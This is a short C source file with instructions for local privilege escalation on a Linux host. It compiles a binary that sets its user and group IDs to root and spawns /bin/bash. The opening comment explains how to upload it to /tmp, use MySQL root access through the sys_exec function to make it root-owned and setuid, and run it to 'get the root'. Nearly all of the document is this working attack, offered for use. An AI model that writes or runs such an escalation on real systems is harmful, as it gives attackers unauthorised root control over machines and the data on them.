/*
gcc suid.c -o suid

upload to target dir /tmp/

if you can login mysql as root (mysql -u root -h localhost)

mysql> select sys_exec('chown root.root /tmp/suid');

mysql> select sys_exec('chmod +s,a+rwx /tmp/suid');

./suid get the root

*/

int main()
{
	setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash");
    return 0;
}
